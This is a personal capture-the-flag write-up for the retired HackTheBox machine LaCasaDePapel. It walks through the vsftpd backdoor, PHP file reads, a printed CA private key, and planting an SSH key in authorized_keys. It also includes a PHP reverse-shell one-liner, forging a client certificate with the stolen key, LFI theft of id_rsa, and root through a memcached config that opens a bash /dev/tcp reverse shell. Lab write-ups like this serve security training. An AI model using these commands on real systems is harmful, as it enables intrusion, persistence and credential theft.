# LaCasaDePapel Helped-Through

Name: LaCasaDePapel
Date:   
Difficulty:  Easy
Goals:
- OSCP Prep
Learnt:
- I hate psy shell
- openssl is still the pain of my existence
- more openssl
- A firefox no export certifcates, but `openssl` will!

[Ippsec](https://www.youtube.com/watch?v=OSRCEOQQJ4E)  and [[LaCasaDePapel.pdf]] were used eventually...
## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/LaCasaDePapel/Screenshots/ping.png)

This machine was done recently in 2024 just to wipe it off the list. I succeed in the sense that I weaponised the information get a working foothold, finding the ca.key. I just had no idea what to actually do with it. Then probably ran out of time and moved on.

Self hosted certificate 
![](ssl.png)

Returning to this - Nuclei found the vsftp version a displayed that there is a backdoor in this version of the application [rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/). This would not count as Auto exploit on Nuclei still which is nice tool pick.
![](vsftg.png)

## Exploit

Due to my goals I will not use the metasploit version of this exploit, instead the public exploit available on [exploitdb](https://www.exploit-db.com/exploits/49757). This does not work as the decoding of the telnetlib.interact does not decode. Then tried [ahervias](https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py)

![](ahervias.png)

Tried [https://github.com/whoamins/vsFTPd-2.3.4-exploit](https://github.com/whoamins/vsFTPd-2.3.4-exploit)
![](tokyo.png)

Found a Tokyo Class, that is self signed cert function,  Nairobi is a user name..and the Dali user.
![](dali-user.png)

`proc_open()`, `shell_exec()` are both disabled

- cant `edit`
- cant run inline shell

Researched [Php vulnerable functions](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720)

[[phpinfo-lacasadepapel-htb]]

![](file-get-contents-passwd.png)

![](getenv.png)

![](server-js.png)

scandir(getcwd()) and file_get_contents, then went wild on the file system
![](user-txt.png)
We cant get it unfortunately

But we can still get the ca.key

```

-----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n

```

Little did I know that probably I had actually tried to make the certificate and then given up not finguring out that incorrect number of `----` which I original had....  
## Foothold And The Return

Review Writeup thus far.
![](nobacktickescape.png)

Notes
```php
scandir(../../../)
file_get_contents(../../../)
```

![](sshkeysomewherepleaseoraconf.png)

```
file_put_contents('../../../home/dali/.ssh/authorized_keys', "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnrtl5nSjU5czHAS+KWZJV4nrJLIQru0WYYFx3CoimF kali@kali\n", FILE_APPEND)
```

![](rmthiswhendone.png)

![](aarghpsyshellagain.png)

Psyshell rabbit hole or doing due diligence - just felt nasty. 
![](everypossiblehacktricksexecphpfunctiontried.png)

I just wanted this. Decided I need to move on from this box 
```
php -r '$sock=fsockopen(getenv("10.10.10.10"),getenv("443"));exec("/bin/sh -i <&3 >&3 2>&3");'
```

So I skipped forums and check the information - I have never created one of these and did not think of it.
![](abouttokothismachinequickly.png)
Looking at this again.
![720-](instructions.png)

WHO ARE THESE PEOPLE AND WHY DO I NEED TO MAKE A CERT!?!
![](gotothepages.png)
The rabbit hole here I mashed into was not fly-over all the service manual for that message.


I only had four `-`s :( and some at the end!
```bash
# Check if it is a valid key
openssl rsa -check -in ca.key
```

Had a hours trouble making certs

Followed the Writeup
![](writeup-useechowithlcdc.png)

Originally did this but failed
![1080](didthisbutfailed.png)

Do not use BurpSuite's browser to get the certificate
```bash
openssl genrsa -out client.key 4096
openssl req -new -key client.key -out client.req
openssl x509 -req -in client.req -CA lacasadepapel-htb.pem -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
```

Trying my patience with burpsuite chrome
![](importcertinburpschrome.png)

Then was juke of success
![](importedcert.png)

The above did not work - switched to firefox and modern firefox will not let you export certificates

This is the big trick of the box.
```bash
echo | openssl s_client -servername hostname -connect 10.129.18.122:443 2>/dev/null | openssl x509 -outform PEM > lacasadepapel.crt
```
[superuser - how-to-save-a-remote-server-ssl-certificate-locally-as-a-file](https://superuser.com/questions/97201/how-to-save-a-remote-server-ssl-certificate-locally-as-a-file)
![](phindfoundopensslfromsuperuser.png)


![](HOLYopensslisaPAIN.png)

![](waitingtobeservethishorrificsite.png)


![](lfifoundinthelcdppath.png)

![](berlinskeys.png)
`https://10.129.18.122/file/U0VBU09OLTIvMDEuYXZp`
![](howdowelfifromscandir.png)

![](season201base64decode.png)

```
echo -n '../.ssh/id_rsa' | base64
```

![](idrsacapturedfromlcdp.png)

![](checkalltheuserslikelasttimeforthekeylcdp.png)
Following the Writeup I `scp`ed `pspy` to the box
![](memcacheinihasasudoinit.png)

![](nodeismemcachingourmemcache.png)

```
mv memcached.ini ini.bak
vi memcached.ini
[program:memcached]
command = bash -c 'bash -i &>/dev/tcp/10.10.14.210/8443 <&1'
```

[Ippsec](https://www.youtube.com/watch?v=OSRCEOQQJ4E) method worked
![](trustinippsecforthehousetobeyourhouse.png)

...root...sigh
![](root.png)
## Post Root Reflections

- Always fly-by the different protocols of webserver